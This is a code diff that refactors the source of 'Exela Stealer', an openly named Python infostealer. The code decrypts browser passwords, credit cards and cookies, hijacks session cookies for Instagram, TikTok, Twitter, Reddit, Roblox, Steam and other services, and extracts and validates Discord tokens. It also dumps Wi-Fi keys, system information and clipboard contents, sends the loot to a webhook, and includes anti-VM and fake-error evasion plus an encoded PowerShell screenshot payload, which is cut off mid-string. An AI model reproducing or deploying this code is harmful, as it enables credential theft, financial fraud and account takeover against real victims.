@@ -17,14 +17,36 @@ startup_method = "%startup_method%".lower()
 Anti_VM = bool("%Anti_VM%")
 FakeError = (bool("%fake_error%"), ("System Error", "The Program can't start because api-ms-win-crt-runtime-|l1-1-.dll is missing from your computer. Try reinstalling the program to fix this problem", 0))
 
-def create_mutex(mutex_value) -> bool:
-    kernel32 = ctypes.windll.kernel32 #kernel32.dll 
-    mutex = kernel32.CreateMutexA(None, False, mutex_value) # creating mutex
-    return kernel32.GetLastError() != 183 # return if the mutex created successfully or not
+class Variables:
+    Passwords = list()
+    Cards = list()
+    Cookies = list()
+    Historys = list()
+    Downloads = list()
+    Autofills = list()
+    Bookmarks = list()
+    Wifis = list()
+    SystemInfo = list()
+    ClipBoard = list()
+    Processes = list()
+    Network = list()
+    FullTokens = list()
+    ValidatedTokens = list()
+    DiscordAccounts = list()
+    SteamAccounts = list()
+    InstagramAccounts = list()
+    TwitterAccounts = list()
+    TikTokAccounts = list()
+    RedditAccounts = list()
+    TwtichAccounts = list()
+    SpotifyAccounts = list()
+    RobloxAccounts = list()
+    RiotGameAccounts = list()
 
 class SubModules:
+    # Calls the CryptUnprotectData function from crypt32.dll
     @staticmethod
-    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str= None) -> bytes: # Calls the CryptUnprotectData function from crypt32.dll
+    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str= None) -> bytes: 
 
         class DATA_BLOB(ctypes.Structure):
 
@@ -77,6 +99,19 @@ class SubModules:
                 return str(SubModules.CryptUnprotectData(EncrypedValue))
         except:
             return "Decryption Error!, Data cant be decrypt"
+        
+    @staticmethod
+    def create_mutex(mutex_value) -> bool:
+        kernel32 = ctypes.windll.kernel32 #kernel32.dll 
+        mutex = kernel32.CreateMutexA(None, False, mutex_value) # creating mutex
+        return kernel32.GetLastError() != 183 # return if the mutex created successfully or not
+    
+    @staticmethod
+    def IsAdmin() -> bool:
+        try:
+            return bool(ctypes.windll.shell32.IsUserAnAdmin())
+        except:
+            return False
 
 class Main:
     def __init__(self) -> None:
@@ -89,30 +124,6 @@ class Main:
         self.FirefoxCookieList = list()
         self.FirefoxHistoryList = list()
         self.FirefoxAutofiList = list()
-        self.processList = list()
-        self.lastCipboardList = list()
-        self.systeminfoList = list()
-        self.password_list = list()
-        self.cookie_list = list()
-        self.card_list = list()
-        self.history_list = list()
-        self.autofill_list = list()
-        self.bookmark_list = list()
-        self.download_list = list()
-        self.NetworkList = list()
-        self.validated_tokens = list()
-        self.full_tokens = list()
-        self.instagramSessionList = list()
-        self.riotGamesSessionList = list()
-        self.tiktokSessionList = list()
-        self.twitterSessionList = list()
-        self.twitchSessionList = list()
-        self.redditSessionList = list()
-        self.spotifySessionList = list()
-        self.steamSessionList = list()
-        self.robloxSessionList = list()
-        self.discordAccountList = list()
-        self.wifiList = list()
     async def main(self):
         try:
             processes = await asyncio.create_subprocess_shell(f"taskkill /F /IM chrome.exe", shell=True, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
@@ -265,7 +276,7 @@ class Main:
                 except:pass
                 for login in logins:
                     if login[0] and login[1] and login[2]:
-                        self.password_list.append(f"URL : {login[0]}\nUsername : {login[1]}\nPassword : {SubModules.Decrpytion(login[2], key)}\nBrowser : {BrowserName}\n======================================================================\n")
+                        Variables.Passwords.append(f"URL : {login[0]}\nUsername : {login[1]}\nPassword : {SubModules.Decrpytion(login[2], key)}\nBrowser : {BrowserName}\n======================================================================\n")
         except:
             pass
     async def GetCards(self) -> None:
@@ -293,7 +304,7 @@ class Main:
                     if card[2] < 10:
                         month = "0" + str(card[2])
                     else:month = card[2]
-                    self.card_list.append(f"{SubModules.Decrpytion(card[0], key)} {month}/{card[1]} {card[3]}\n")
+                    Variables.Cards.append(f"{SubModules.Decrpytion(card[0], key)} {month}/{card[1]} {card[3]}\n")
         except:
             pass 
     async def GetCookies(self) -> None:
@@ -329,7 +340,7 @@ class Main:
                 twitch_cookie = None
                 for cookie in cookies:
                     dec_cookie = SubModules.Decrpytion(cookie[3], key)
-                    self.cookie_list.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{dec_cookie}\n")
+                    Variables.Cookies.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{dec_cookie}\n")
                     if "instagram" in str(cookie[0]).lower() and "sessionid" in str(cookie[1]).lower():
                         asyncio.create_task(self.InstaSession(dec_cookie, BrowserName))
                     if "tiktok" in str(cookie[0]).lower() and str(cookie[1]) == "sessionid":
@@ -426,7 +437,7 @@ class Main:
                     os.remove(copied_file_path)
                 except:pass
                 for history in historys:
-                    self.history_list.append(f"ID : {history[0]} | URL : {history[1]} | Title : {history[2]} | Visit Count : {history[3]} | Last Visit Time {history[4]}\n")
+                    Variables.Historys.append(f"ID : {history[0]} | URL : {history[1]} | Title : {history[2]} | Visit Count : {history[3]} | Last Visit Time {history[4]}\n")
         except:
             pass
 
@@ -447,7 +458,7 @@ class Main:
                 except:pass
                 for autofill in autofills:
                     if autofill:
-                        self.autofill_list.append(f"{autofill}\n")
+                        Variables.Autofills.append(f"{autofill}\n")
         except Exception as e:print(e)
 
     async def GetBookMark(self) -> None:
@@ -459,7 +470,7 @@ class Main:
                         data = json.load(file)
                     data = data["roots"]["bookmark_bar"]["children"]
                     if data:
-                        self.bookmark_list.append(f"Browser Path : {path}\nID : {data['id']}\nName : {data['name']}\nURL : {data['url']}\nGUID : {data['guid']}\nAdded At : {data['date_added']}\n\n=========================================================")
+                        Variables.Bookmarks.append(f"Browser Path : {path}\nID : {data['id']}\nName : {data['name']}\nURL : {data['url']}\nGUID : {data['guid']}\nAdded At : {data['date_added']}\n\n=========================================================")
         except:
             pass
     async def GetDownload(self) -> None:
@@ -478,7 +489,7 @@ class Main:
                     os.remove(copied_file_path)
                 except:pass
                 for download in downloads:
-                    self.download_list.append(f"{download[0]} : {download[1]}\n")
+                    Variables.Downloads.append(f"{download[0]} : {download[1]}\n")
         except:
             pass
     async def StealUplay(self, uuid:str) -> None:
@@ -638,7 +649,7 @@ class Main:
         except:
             pass
         else:
-            self.riotGamesSessionList.append(f'Username : {username}\nEmail : {email}\nRegion : {region}\nLocale : {locale}\nCountry : {country}\nMFA Enabled : {mfa}\nCookie : {cookie}\n======================================================================\n')
+            Variables.RiotGameAccounts.append(f'Username : {username}\nEmail : {email}\nRegion : {region}\nLocale : {locale}\nCountry : {country}\nMFA Enabled : {mfa}\nCookie : {cookie}\n======================================================================\n')
     async def InstaSession(self, cookie, browser:str) -> None:
         try:
             pp = "https://i.hizliresim.com/8po0puy.jfif"
@@ -710,7 +721,7 @@ class Main:
         except Exception as e:
             print(str(e))
         else:
-            self.instagramSessionList.append(f"Cookie : {cookie}\nProfile URL : {profileURL}\nUsername : {username}\nNick Name : {fullname}\nis Verified : {verify}\nEmail : {email}\nFollowers : {followers}\nFollowing : {following}\nBiography : {bio}\n======================================================================\n")
+            Variables.InstagramAccounts.append(f"Cookie : {cookie}\nProfile URL : {profileURL}\nUsername : {username}\nNick Name : {fullname}\nis Verified : {verify}\nEmail : {email}\nFollowers : {followers}\nFollowing : {following}\nBiography : {bio}\n======================================================================\n")
     async def TikTokSession(self, cookie, browser:str) -> None:
         try:
             email = ''
@@ -767,7 +778,7 @@ class Main:
         except:
             pass
         else:
-            self.tiktokSessionList.append(f"Cookie : {cookies}\nUser identifier : {user_id}\nProfile URL : https://tiktok.com/@{username}\nUsername : {username}\nEmail : {email}\nPhone : {phone}\nCoins : {coins}\n======================================================================\n")
+            Variables.TikTokAccounts.append(f"Cookie : {cookies}\nUser identifier : {user_id}\nProfile URL : https://tiktok.com/@{username}\nUsername : {username}\nEmail : {email}\nPhone : {phone}\nCoins : {coins}\n======================================================================\n")
 
     async def TwitterSession(self, cookie, browser:str) -> None:
         try:
@@ -841,7 +852,7 @@ class Main:
                 async with session.post(webhook, json=payload, headers=headers) as response:
                     pass
             
-            self.twitterSessionList.append(f"Username : {username}\nScreen Name : {nickname}\nFollowers : {req['followers_count']}\nFollowing : {req['friends_count']}\nTweets : {req['statuses_count']}\nVerified : {req['verified']}\nCreated At : {req['created_at']}\nProfile URL : {profileURL}\nCookie : {cookie}\nBiography : {description}\n=====================================================\n")
+            Variables.TwitterAccounts.append(f"Username : {username}\nScreen Name : {nickname}\nFollowers : {req['followers_count']}\nFollowing : {req['friends_count']}\nTweets : {req['statuses_count']}\nVerified : {req['verified']}\nCreated At : {req['created_at']}\nProfile URL : {profileURL}\nCookie : {cookie}\nBiography : {description}\n=====================================================\n")
         except Exception as e:
             print(str(e))
 
@@ -927,7 +938,7 @@ class Main:
         except:
             pass
         else:
-            self.twitchSessionList.append(f"Cookie : {auth_token}\nProfile URL : {acc_url}\nID : {id}\nUsername : {login}\nDisplay Name : {displayName}\nEmail : {email}\nHas Prime : {hasPrime}\nis Partner : {isPartner}\nLanguage : {lang}\nBits : {bits}\nFollowers : {followers}\n======================================================================\n")
+            Variables.TwtichAccounts.append(f"Cookie : {auth_token}\nProfile URL : {acc_url}\nID : {id}\nUsername : {login}\nDisplay Name : {displayName}\nEmail : {email}\nHas Prime : {hasPrime}\nis Partner : {isPartner}\nLanguage : {lang}\nBits : {bits}\nFollowers : {followers}\n======================================================================\n")
     async def SpotifySession(self, cookie, browser:str) -> None:
         try:
             url = 'https://www.spotify.com/api/account-settings/v1/profile'
@@ -979,7 +990,7 @@ class Main:
         except:
             pass
         else:
-            self.spotifySessionList.append(f"Cookie : {cookie}\nProfile URL : https://open.spotify.com/user/{username}\nEmail : {email}\nUsername : {username}\nGender : {gender}\nBirthdate : {birthdate}\nCountry : {country}\n======================================================================\n")
+            Variables.SpotifyAccounts.append(f"Cookie : {cookie}\nProfile URL : https://open.spotify.com/user/{username}\nEmail : {email}\nUsername : {username}\nGender : {gender}\nBirthdate : {birthdate}\nCountry : {country}\n======================================================================\n")
     async def RedditSession(self, cookie, browser:str) -> None:
         try:
             gmail = ""
@@ -1049,7 +1060,7 @@ class Main:
         except:
             pass
         else:
-            self.redditSessionList.append(f"Cookie : {cookies}\nProfile URL : {profileUrl}\nUsername : {username}\nEmail : {gmail}\nComment Karma : {commentKarma}\nTotal Karma : {totalKarma}\nis Mod : {mod}\nis Gold : {gold}\nSuspended : {suspended}\n======================================================================\n")
+            Variables.RedditAccounts.append(f"Cookie : {cookies}\nProfile URL : {profileUrl}\nUsername : {username}\nEmail : {gmail}\nComment Karma : {commentKarma}\nTotal Karma : {totalKarma}\nis Mod : {mod}\nis Gold : {gold}\nSuspended : {suspended}\n======================================================================\n")
     async def RobloxSession(self, cookie, browser:str) -> None:
         try:
             headers = {'cookie':f'.ROBLOSECURITY={cookie}',"Accept-Encoding": "identity"}
@@ -1095,7 +1106,7 @@ class Main:
         except:
             pass
         else:
-            self.robloxSessionList.append(f"Name : {str(name)}\nDisplay Name : {str(DisplayName)}\nEmail : {str(email)}\nID : {str(id)}\nEmail Verified : {str(isEmailVerified)}\nRobux : {str(robux)}\nCookie : {cookie}\n======================================================================\n")
+            Variables.RobloxAccounts.append(f"Name : {str(name)}\nDisplay Name : {str(DisplayName)}\nEmail : {str(email)}\nID : {str(id)}\nEmail Verified : {str(isEmailVerified)}\nRobux : {str(robux)}\nCookie : {cookie}\n======================================================================\n")
     async def GetTokens(self) -> None:
         try:
             discord_dirs = {
@@ -1114,6 +1125,7 @@ class Main:
                     if os.path.isdir(new_path):
                         dirs.append(new_path)
             for directorys in dirs:
+                full_tokens = Variables.FullTokens
                 if "cord" in directorys:  # extract tokens from discord 
                     key = SubModules.GetKey(directorys.replace(r"Local Storage\leveldb", "Local State"))
                     for y in os.listdir(directorys):
@@ -1124,8 +1136,8 @@ class Main:
                                     if tokens:
                                         enc_token = base64.b64decode(tokens.split("dQw4w9WgXcQ:")[1])
                                         dec_token = SubModules.Decrpytion(enc_token, key)
-                                        if not dec_token in self.full_tokens:
-                                            self.full_tokens.append(dec_token)
+                                        if not dec_token in full_tokens:
+                                            full_tokens.append(dec_token)
                                             await self.ValidateTokenAndGetInfo(dec_token)
                                         else:
                                             continue                                      
@@ -1136,8 +1148,8 @@ class Main:
                             with open(file_name, "r" ,encoding="utf-8", errors="ignore") as file:
                                 for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", file.read()):
                                     if token:
-                                        if not token in self.full_tokens:
-                                            self.full_tokens.append(token)
+                                        if not token in full_tokens:
+                                            full_tokens.append(token)
                                             await self.ValidateTokenAndGetInfo(token)
                                         else:
                                             continue
@@ -1261,81 +1273,65 @@ class Main:
     async def ValidateTokenAndGetInfo(self, token:str) -> None:
         try:
             headers = {
-                'Authorization' : token
-            }
+            'Authorization' : token
+        }
             acc_info = 'https://discord.com/api/v8/users/@me'
-            gift_codes = 'https://discord.com/api/v9/users/@me/outbound-promotions/codes'
             hq_friends_url = 'https://discord.com/api/v8/users/@me/relationships'
-            guilds_url = 'https://discord.com/api/v9/users/@me/guilds?with_counts=true'
             pp = None
             async with aiohttp.ClientSession() as session:
                 async with session.get(acc_info, headers=headers) as response:
                     if response.status == 200:
-                        self.validated_tokens.append(token)
+                        Variables.ValidatedTokens.append(token)
                         data = await response.json()
-                        avatar = data["avatar"]
-                        badges = ' '.join([flag[0] for flag in self.calc_flags(data['public_flags'])])
-                        avatar_url = f"https://cdn.discordapp.com/avatars/{data['id']}/{avatar}"
-                        if avatar:
-                            async with session.get(f"{avatar_url}.png", headers=headers) as av:
-                                if av.status == 200:
-                                    pp= avatar_url +".png"
-                                else:pp += avatar_url + ".gif"
-                        async with session.get(hq_friends_url, headers=headers) as response2:
-                            req = await response2.json()
-                        async with session.get(guilds_url, headers=headers) as response4:
-                            guilds = await response4.json()
-                        async with session.get(gift_codes, headers=headers) as response3:
-                            data2 = await response3.json()
-                    else:return
-            
-            if req:
-                hq_friends = []
-                for friend in req:
-                    unprefered_flags = [64, 128, 256, 1048704]
-                    inds = [flag[1] for flag in self.calc_flags2(friend['user']['public_flags'])[::-1]]
-                    for flag in unprefered_flags:
-                        inds.remove(flag) if flag in inds else None
-                    if inds != []:
-                        hq_badges = ' '.join([flag[0] for flag in self.calc_flags2(friend['user']['public_flags'])[::-1]])
-                        hq_data = f"{hq_badges} - ``{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})``"
-                        if len('\n'.join(hq_friends)) + len(data) >= 1024:
-                            break   
-                        hq_friends.append(hq_data)
-                if len(hq_friends) > 0:
-                    hq_friends = '\n'.join(hq_friends)
-                                
-            if guilds:
-                hq_guilds = []
-                for guild in guilds:
-                    admin = True if guild['permissions'] == '4398046511103' else False
-                    owner = True if guild['owner'] else False
-                    owner_ico = "✅" if guild['owner'] else "❌"
-                    if owner or admin:
-                        async with aiohttp.ClientSession() as invite_session:
-                            async with invite_session.get(f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}) as inv:
-                                invites = await inv.json()
-                        if len(invites) > 0:
-                            invite = f"https://discord.gg/{invites[0]['code']}"
-                        else:
-                            invite = "https://t.me/ExelaStealer"
-                        hq_guild_data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner_ico}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})"
-                        if len('\n'.join(hq_guilds)) + len(data) >= 1024:
-                            break
 
-                        hq_guilds.append(hq_guild_data)
+                        avatar = data.get("avatar", "")
+                        public_flags = data.get('public_flags', [])
+                        badges = ' '.join([flag[0] for flag in self.calc_flags(public_flags)])
+                        premium_type = data.get("premium_type", "")
+                        if avatar:
+                            async with session.get(f"https://cdn.discordapp.com/avatars/{data['id']}/{avatar}.png", headers=headers) as av:
+                                if av.status == 200:
+                                    pp = f"https://cdn.discordapp.com/avatars/{data['id']}/{avatar}.png"
+                                else:
+                                    pp = f"https://cdn.discordapp.com/avatars/{data['id']}/{avatar}.gif"
+                        async with session.get(hq_friends_url, headers=headers) as response2:
+                            friend_data = await response2.json()
+                    else:
+                        return
+            
             nitroType = "No Nitro"
-            premium_type = data["premium_type"]
-            if premium_type == 0:
-                nitroType='None'
-            elif premium_type == 1:
-                nitroType = 'Nitro Classic'
-            elif premium_type == 2:
-                nitroType = 'Nitro'
-            elif premium_type == 3:
-                nitroType = 'Nitro Basic'
-            else:
-                nitroType = 'None'
+            try:
+                if premium_type == 0:
+                    nitroType='None'
+                elif premium_type == 1:
+                    nitroType = 'Nitro Classic'
+                elif premium_type == 2:
+                    nitroType = 'Nitro'
+                elif premium_type == 3:
+                    nitroType = 'Nitro Basic'
+                else:
+                    nitroType = 'None'
+            except:
+                pass
+            hq_friends = []
+            try:
+                if friend_data:
+                    for friend in friend_data:
+                        unprefered_flags = [64, 128, 256, 1048704]
+                        inds = [flag[1] for flag in self.calc_flags2(friend['user']['public_flags'])[::-1]]
+                        for flag in unprefered_flags:
+                            inds.remove(flag) if flag in inds else None
+                        if inds != []:
+                            hq_badges = ' '.join([flag[0] for flag in self.calc_flags2(friend['user']['public_flags'])[::-1]])
+                            hq_data = f"{hq_badges} - ``{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})``"
+                            if len('\n'.join(hq_friends)) + len(data) >= 1024:
+                                break   
+                            hq_friends.append(hq_data)
+                            if len(hq_friends) > 0:
+                                hq_friends = '\n'.join(hq_friends)
+            except:
+                pass
+
             if data:
                 embed_data = {
                 "title": "***Exela Stealer***",
@@ -1348,46 +1344,19 @@ class Main:
                     embed_data["thumbnail"]["url"] = pp
                 bio = str(data['bio'])
                 bio = bio.replace("\n", ", ")
-                codes = []
-                if data:
-                    for code in data2:
-                        name = code['promotion']['outbound_title']
-                        code = code['code']
-                        data = f":gift: ``{name}``\n:ticket: ``{code}``"
-                        if len('\n\n'.join(codes)) + len(data) >= 1024:
-                            break
-
-                        codes.append(data)
-
-                    if len(codes) > 0:
-                        codes = '\n\n'.join(codes)
-
-                    else:
-                        codes = None
 
                 fields = [
-                {"name": "Token", "value": "``" + token + "``", "inline": False},
-                {"name": "Username", "value": "``" + str(f'{data["username"]}#{data["discriminator"]}') + "``", "inline": True},
-                {"name": "Email", "value": "``" + str(data['email']) + "``", "inline": True},
-                {"name": "ID", "value": "``" +  str(data["id"]) + "``", "inline": True},
-                {"name": "Phone", "value": "``" + str(data['phone']) + "``", "inline": True},
-                {"name": "MFA Enabled?", "value":"``" + str(data['mfa_enabled']) + "``", "inline": True},
-                {"name": "Nitro Type", "value": "``" + str(nitroType) + "``", "inline": True},
-                {"name": "Badges", "value": str(badges if badges != '' else 'None'), "inline": True},]
-                if codes:
-                    try:
-                        fields.append({"name": "Gift Codes", "value": str(codes), "inline": False},)
-                    except:
-                        pass
+                    {"name": "Token", "value": "``" + str(token) + "``", "inline": False},
+                    {"name": "Username", "value": "``" + str(f'{data["username"]}#{data["discriminator"]}') + "``", "inline": True},
+                    {"name": "Email", "value": "``" + str(data['email']) + "``", "inline": True},
+                    {"name": "ID", "value": "``" +  str(data["id"]) + "``", "inline": True},
+                    {"name": "Phone", "value": "``" + str(data['phone']) + "``", "inline": True},
+                    {"name": "MFA Enabled?", "value":"``" + str(data['mfa_enabled']) + "``", "inline": True},
+                    {"name": "Nitro Type", "value": "``" + str(nitroType) + "``", "inline": True},
+                    {"name": "Badges", "value": str(badges if badges != '' else 'None'), "inline": True},]
                 if hq_friends:
                     try:
                         fields.append({"name": "Hq Friends", "value":  hq_friends, "inline": False},)
-                    except:
-                        pass
-                if hq_guilds:
-                    try:
-                        hq_guilds = '\n'.join(hq_guilds)
-                        fields.append({"name": "Hq Guilds", "value":  hq_guilds, "inline": False},)
                     except:
                         pass
                 embed_data["fields"] = fields
@@ -1401,7 +1370,7 @@ class Main:
                     }
                     async with session.post(webhook, json=payload, headers=headers) as response:
                         pass
-                self.discordAccountList.append(f"Username : {data['username']}#{data['discriminator']}\nEmail : {data['email']}\nID : {data['id']}\nPhone : {str(data['phone'])}\nMFA Enabled : {data['mfa_enabled']}\nNitro Type : {nitroType}\nToken : {token}\nBiography : {bio}\nGift Codes : {str(codes)}\n======================================================================\n")
+                Variables.DiscordAccounts.append(f"Username : {data['username']}#{data['discriminator']}\nEmail : {data['email']}\nID : {data['id']}\nPhone : {str(data['phone'])}\nMFA Enabled : {data['mfa_enabled']}\nNitro Type : {nitroType}\nToken : {token}\nBiography : {bio}\n======================================================================\n")
 
         except Exception as e:
             print(e)
@@ -1536,7 +1505,7 @@ class Main:
                                     }
                                     async with session.post(webhook, json=payload, headers=headers) as response:
                                         pass
-                                self.steamSessionList.append(f"Username : {personname}\nRealname : {realname}\nID : {steamid}\nTimecreated : {timecreated}\nProfile URL : {profileurl}\n======================================================================\n")
+                                Variables.SteamAccounts.append(f"Username : {personname}\nRealname : {realname}\nID : {steamid}\nTimecreated : {timecreated}\nProfile URL : {profileurl}\n======================================================================\n")
 
         except:
             pass            
@@ -1573,7 +1542,7 @@ class Main:
                     profile_output = stdout.decode(current_code_page)
                 except:profile_output = stdout.decode("utf-8")
                 password_match = re.search(r'Key content\s*: (.*)', profile_output, re.IGNORECASE)
-                self.wifiList.append((profile_name, password_match.group(1) if password_match else "No password found"))
+                Variables.Wifis.append((profile_name, password_match.group(1) if password_match else "No password found"))
         except:
             pass
     async def GetSystemInfo(self) -> None:
@@ -1583,7 +1552,7 @@ class Main:
             current_code_page = stdout.decode().split(":")[1].strip()
             result = await asyncio.create_subprocess_shell(r'echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable#### & set & echo ####Logical Disk#### & wmic logicaldisk get caption,description,providername & echo ####User Info#### & net user & echo ####Online User#### & query user & echo ####Local Group#### & net localgroup & echo ####Administrators Info#### & net localgroup administrators & echo ####Guest User Info#### & net user guest & echo ####Administrator User Info#### & net user administrator & echo ####Startup Info#### & wmic startup get caption,command & echo ####Tasklist#### & tasklist /svc & echo ####Ipconfig#### & ipconfig/all & echo ####Hosts#### & type C:\WINDOWS\System32\drivers\etc\hosts & echo ####Route Table#### & route print & echo ####Arp Info#### & arp -a & echo ####Netstat#### & netstat -ano & echo ####Service Info#### & sc query type= service state= all & echo ####Firewallinfo#### & netsh firewall show state & netsh firewall show config', stdout=asyncio.subprocess.PIPE, shell=True)
             stdout, _ = await result.communicate()
-            self.systeminfoList.append(stdout.decode(current_code_page))
+            Variables.SystemInfo.append(stdout.decode(current_code_page))
         except Exception as e:
             print(e)
     async def GetNetworkInfo(self) -> None:
@@ -1596,7 +1565,7 @@ class Main:
                     city = data["city"]
                     timezone = data["timezone"]
                     isp_info = data["isp"] + f" {data['org']} {data['as']}"
-                    self.NetworkList.append((ip, country, city, timezone, isp_info))
+                    Variables.Network.append((ip, country, city, timezone, isp_info))
         except Exception as e:
             print(str(e))
     async def GetProcessINfo(self) -> None:
@@ -1608,7 +1577,7 @@ class Main:
                 shell=True
             )
             stdout, stderr = await process.communicate()
-            self.processList.append(stdout.decode())
+            Variables.Processes.append(stdout.decode())
         except:pass
     async def GetLastClipboard(self) -> None:
         try:
@@ -1620,7 +1589,7 @@ class Main:
             )
             stdout, stderr = await process.communicate()
             if stdout:
-                self.lastCipboardList.append(stdout.decode(errors="ignore"))
+                Variables.ClipBoard.append(stdout.decode(errors="ignore"))
         except:
             pass
     async def WriteToText(self) -> None:
@@ -1658,15 +1627,33 @@ class Main:
             command = "JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIA